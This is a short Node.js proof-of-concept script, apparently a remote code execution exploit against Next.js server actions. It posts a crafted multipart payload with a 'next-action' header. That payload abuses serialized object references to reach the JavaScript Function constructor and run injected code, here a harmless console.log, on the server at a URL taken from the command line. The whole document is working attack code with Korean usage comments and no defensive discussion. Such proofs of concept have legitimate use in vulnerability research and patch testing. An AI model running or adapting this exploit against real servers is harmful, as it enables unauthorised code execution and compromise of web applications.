#!/usr/bin/env node

import FormData from 'form-data';
import fetch from 'node-fetch';

const payload = {
  '0': '$1',
  '1': {
      'status':'resolved_model',
      'reason':0,
      '_response':'$4',
      'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
      'then':'$2:then'
  },
  '2': '$@3',
  '3': [],
  '4': {
      '_prefix':'console.log(7*7+1)//',
      '_formData':{
          'get':'$3:constructor:constructor'
      },
      '_chunks':'$2:_response:_chunks',
  }
}

function createFormData() {
  const fd = new FormData();
  for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]));
  }
  return fd;
}

function exploitNext(baseUrl) {
  const fd = createFormData();
  
  return fetch(baseUrl, {
      method: 'POST',
      headers: {
          'next-action': 'x',
          ...fd.getHeaders()
      },
      body: fd.getBuffer()
  }).then(async (res) => {
      console.log(`Status: ${res.status}`);
      const text = await res.text();
      console.log('Response:', text);
      return { status: res.status, text };
  }).catch((err) => {
      console.error('Error:', err.message);
      throw err;
  });
}

// 명령줄 인자 처리
// 사용법: node poc2.mjs [baseUrl]
// 예: node poc2.mjs http://localhost:3000

const args = process.argv.slice(2);
const baseUrl = args[0] || 'http://localhost:3000';

console.log(`Exploiting Next.js at ${baseUrl}`);
exploitNext(baseUrl)
  .then(() => process.exit(0))
  .catch(() => process.exit(1));